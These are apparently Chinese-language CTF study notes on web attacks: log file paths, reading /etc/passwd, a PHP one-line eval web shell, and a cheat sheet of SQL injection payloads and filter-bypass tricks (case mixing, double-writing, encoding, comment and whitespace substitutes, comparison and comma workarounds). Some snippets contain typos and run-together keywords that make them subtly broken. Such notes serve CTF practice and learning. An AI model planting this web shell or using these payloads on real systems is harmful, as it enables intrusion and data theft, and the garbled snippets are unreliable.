对于Apache，日志存放路径：/var/log/apache/access.log

对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log

可以尝试读取 `/etc/passwd` 如果可行则代表操作系统为 Linux

---

（这似乎是一句很常用到的木马？）

`<?php @eval($_POST['CMD']);?> `

---

php语法中，如果在函数前加入`!`则表示取反操作符，即当函数输出`true`时最终输出`flase`

---

注入点为**数值型注入**时，可往题目原访问点传一个-1,由于id通常不为负数,后端根据id查询不到内容,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置

---

**几种绕过空格限制的方法：**

+ URL编码：

	1. 最常用的空格替换是 %20，这是空格的标准URL编码。
	2. 在某些情况下，%A0（代表不换行空格）也可能有效，尤其是在Mysql环境中。
	3. 其他可能的编码包括 %0A（换行）、%0B（垂直制表）、%0C（表格制表）、%0D（回车）、%09（水平制表）等，它们在特定上下文中可能被解析为空格。

+ 特殊字符：

	1. 使用全角空格（　），在一些不严格的过滤机制中可能被接受。
	2. 非打印字符，如%C2%A0（Unicode的不换行空格）。

+ 注释符和字符串连接：

	在SQL注入场景中，可以利用注释符（如-- 或 /* ... */）来规避空格需求，或者在条件语句中使用字符串连接符（如MySQL中的concat()函数）来构造无需空格的语句。

+ 编码转换：
	利用HTML实体编码，如 &#32; 表示空格，但这通常不适用于URL或查询参数，更适合于HTML内容本身。

+ 多字节字符：
	某些多字节字符（尤其是全角字符或特殊Unicode字符）在某些系统或库中可能被解释为空格。

+ 利用编程语言特性：
	在一些语言中，如Python，空格在某些上下文中可能不是必需的（如使用点号访问属性时）。

+ 调整语法结构：
	重新组织SQL查询或其他命令的结构，避免需要空格的地方。

+ 利用特定漏洞或弱点：
	如文件路径处理中的特殊案例，可能允许使用非标准字符作为路径分隔符。

---

在linux中，/var/www/html为网站文件默认存放位置

---

SQL注入

**注释符**

```
'#', '--+', '-- -', '%23', '%00', '/**/'
```

 **"and、or" 过滤**

```SQL
可以使用"&&"和"||"代替
?id=1 && 1=1 --+

# 盲注，异或运算相同为0，不同为1；根据返回值0，1判断
?id=1 union select (substr(database(),1,1)='s') ^ 0 --
```

**大小写绕过**

```SQL
id=-1' UnIoN SeLeCT xxx
```

**双写绕过**

适用于将关键词置空的场景

```SQL
id=-1'UNIunionONSeLselectECT1,2,3–-
```

**编码绕过**

可以使用URL，hex，ASCII等编码绕过

例如'or 1=1

```SQL
27%20%4F%52%201%3D%31%20%2D%2D
```

**注释绕过**

内联注释/**/将关键词分隔开

```SQL
id=1' UN/**/ION SE/**/LECT database() --
```

#### 空格过滤

内联注释代替空格

```SQL
id=1/**/and/**/1=1
```

括号嵌套

```SQL
select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());
```

制表符、换行、不可见空格

```SQL
%09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格)
```

反引号

```SQL
union(selecttable_name,table_typefrominformation_schema.tables);
```

#### 比较符号 "=、<、>"过滤

in()

```SQL
ascii(substr(select database(),1,1)) in(115);        //根据回显判断
```

like

```
like代替'='
```

正则表达式

```SQL
select database() regexp '^s'; //根据回显判断
```

#### 逗号过滤

逗号被过滤时可以使用from...for...

```SQL
select substr(select database() from 1 for 1);
select substr(select database() from 2 for 1);
```

limit中的逗号可以替换成offset

```SQL
select * from users limit 1 offset 2;
```

需要注意，limit 1,2 指的是从第一行往后取2行（包括第一行和第二行)；而limit 1 offset 2是从第一行开始只取第二行
